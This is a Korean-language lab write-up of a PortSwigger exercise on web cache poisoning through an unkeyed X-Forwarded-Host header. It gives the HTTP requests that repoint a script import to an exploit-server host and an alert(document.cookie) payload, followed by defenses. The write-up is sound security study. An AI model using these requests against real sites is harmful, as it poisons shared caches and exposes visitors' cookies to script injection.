# Lab: Web cache poisoning with an unkeyed header

## 개요

- **난이도**: Practitioner
- **주제**: Web Cache Poisoning — Unkeyed Header(`X-Forwarded-Host`) / 리소스 임포트 URL 조작 / XSS
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

## 목표

캐시를 오염시켜 홈 페이지가 공격자 서버의 JavaScript 를 임포트하도록 만들고, 방문자 브라우저에서 `alert(document.cookie)` 를 실행시킨다.

## 기초 개념 — Web Cache Poisoning

### 캐시 키(Cache Key)와 Unkeyed Input

```
[캐시]
  프록시/서버가 응답을 저장해 다음 요청에 재사용
  응답을 동일한 것으로 취급하는 기준 = Cache Key

[Cache Key 예]
  보통 호스트 + 경로 + (일부) 쿼리스트링

[Unkeyed Input]
  요청에 포함되지만 Cache Key 에는 포함되지 않는 값
  → 값만 바꿔도 같은 캐시 항목을 덮어쓸 수 있음
  → 응답에 반영되면 캐시를 악성 응답으로 오염 가능
```

이번 랩의 `X-Forwarded-Host` 가 대표적인 unkeyed header 다.

### 공격 3단계

```
1) Unkeyed input 식별
2) 그 입력으로 해로운(harmful) 응답 유도
3) 그 응답이 캐시에 저장되도록 함
```

## 취약 지점

### 1. `X-Forwarded-Host` 가 unkeyed

```
GET /?cb=1234 HTTP/1.1
X-Forwarded-Host: example.com
```

Cache Key 에는 헤더가 포함되지 않음 → 같은 경로의 캐시를 덮어쓸 수 있다.

### 2. 헤더가 리소스 임포트 URL 생성에 사용됨

```
홈 페이지 응답에 다음이 포함됨:
  <script src="https://example.com/resources/js/tracking.js"></script>
                          └── X-Forwarded-Host 값이 그대로 반영
```

즉, `X-Forwarded-Host` 로 JS 임포트의 **호스트(절대 URL)** 를 조작할 수 있다.

### 3. 응답이 캐시됨

```
응답 헤더: X-Cache: hit
→ 동일 Cache Key 요청은 캐시된 응답을 그대로 수신
```

## 공격 단계

### 1단계 — 정상 요청 분석

홈 페이지 `GET /` 을 Burp Repeater 로 보낸다.
캐시 오염 중 다른 사용자 영향을 피하려고 **cache-buster** 쿼리를 붙인다.

```
GET /?cb=1234
```

### 2단계 — unkeyed header 확인

`X-Forwarded-Host` 를 임의 값으로 넣어 반영 여부를 본다.

```
GET /?cb=1234 HTTP/1.1
X-Forwarded-Host: example.com
```

응답에 `https://example.com/resources/js/tracking.js` 가 반영되고,
재전송 시 `X-Cache: hit` 가 보이면 캐시됨을 확인할 수 있다.

### 3단계 — 익스플로잇 서버 준비

익스플로잇 서버 파일 이름을 취약 경로와 동일하게 맞춘다.

```
파일 경로/이름: /resources/js/tracking.js
본문:          alert(document.cookie)
```

### 4단계 — 캐시 오염

cache-buster(`?cb=1234`)를 제거하고, 익스플로잇 서버를 가리키도록 헤더를 설정한다.

```
GET / HTTP/1.1
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

응답에 익스플로잇 서버 URL 이 반영되고 `X-Cache: hit` 가 나올 때까지 재전송한다.

```
<script src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js"></script>
```

### 5단계 — 피해자 유도

브라우저에서 오염된 URL 을 열어 `alert(document.cookie)` 가 뜨는지 확인한다.
(이 랩의 캐시는 30초마다 만료되므로 **만료 전에** 확인)

### 6단계 — 유지

피해자가 오염된 동안 페이지에 접속해야 랩이 풀린다.
30초마다 캐시가 리셋되므로, 해결될 때까지 몇 초 간격으로 **재오염 요청을 반복**한다.

## 핵심 개념 정리

```
[Cache-buster (?cb=1234)]
  공격 중 다른 사용자에게 영향을 주지 않도록 고유 쿼리로 별도 캐시 항목을 만드는 용도

[X-Cache: hit / miss]
  hit  : 캐시된 응답 반환 (오염 성공 확인)
  miss : 백엔드에서 새로 생성

[Unkeyed header]
  X-Forwarded-Host / X-Host / X-Forwarded-Scheme 등
  응답에 반영되고 캐시 키에 없으면 오염 가능
```

## 방어

```
[근본 원인]
  1) X-Forwarded-Host 등 클라이언트 헤더를 응답 생성에 사용
  2) 그 헤더가 Cache Key 에 포함되지 않음
  3) 캐시가 응답을 저장/재사용

[올바른 방어]
  1. 클라이언트 제공 헤더를 신뢰하지 않음
     - 리소스/링크/URL 생성은 설정된 정식(canonical) 도메인 사용
     - Host/X-Forwarded-* 값을 응답에 반영하지 않음
  2. 캐시 키 설계
     - 응답에 영향을 주는 입력은 모두 캐시 키에 포함
     - Vary 헤더/캐시 규칙 정비
  3. 프록시 경계 정리
     - 신뢰 경계 프록시에서 X-Forwarded-* 덮어쓰기/정규화
  4. 캐시 가능 여부 최소화 (민감/동적 응답은 no-store)
  5. 서브리소스 무결성(SRI)·CSP 로 외부 스크립트 로드 완화

[주의]
  "요청 헤더는 클라이언트가 보낸다" + "캐시 키에 없다" + "응답에 반영된다"
  세 조건이 겹치면 캐시 오염이 성립한다.
```

## 핵심 정리

- `X-Forwarded-Host` 가 unkeyed 이면서 응답의 JS 임포트 URL 생성에 사용되어 캐시 오염이 가능했다.
- 캐시를 익스플로잇 서버의 `/resources/js/tracking.js` 를 가리키게 오염시켜 `alert(document.cookie)` 를 실행했다.
- `X-Cache: hit` 로 오염을 확인하고, 30초 캐시 만료 전에 피해자를 유도(재오염 반복)해 랩을 풀었다.
- 방어는 헤더 불신(정식 도메인 사용)과 응답에 영향을 주는 입력의 캐시 키 포함이다.

## 배운 점

- 캐시 오염은 "unkeyed input + harmful response + caching" 세 조건의 결합이다.
- unkeyed header 를 식별하는 것이 핵심이며, cache-buster 와 `X-Cache` 헤더가 분석 도구가 된다.
- 이번 랩은 `X-Forwarded-Host` 신뢰 문제로, 14-authentication 의 password reset poisoning(011)과 같은 뿌리(Host 헤더 신뢰)를 공유한다.
- 이후 랩에서는 cookie 처리, 다중 헤더, 캐시 구현 결함(키 정규화 등)으로 확장된다.
